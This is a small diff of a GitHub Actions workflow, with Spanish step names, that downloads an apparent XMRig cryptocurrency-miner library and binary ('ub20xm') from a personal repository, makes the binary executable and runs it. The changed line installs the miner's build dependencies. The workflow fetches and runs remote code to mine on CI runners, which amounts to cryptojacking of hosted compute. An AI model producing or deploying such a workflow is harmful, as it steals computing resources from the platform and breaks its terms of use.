@@ -17,7 +17,7 @@ jobs:
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/libxmrig-asm.a
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm
     - name: Dependencias.
-      run: sudo apt install hwloc
+      run: sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
     - name:  Dar permisos.
       run: chmod u+x ub20xm
     - name: Ejecutar.
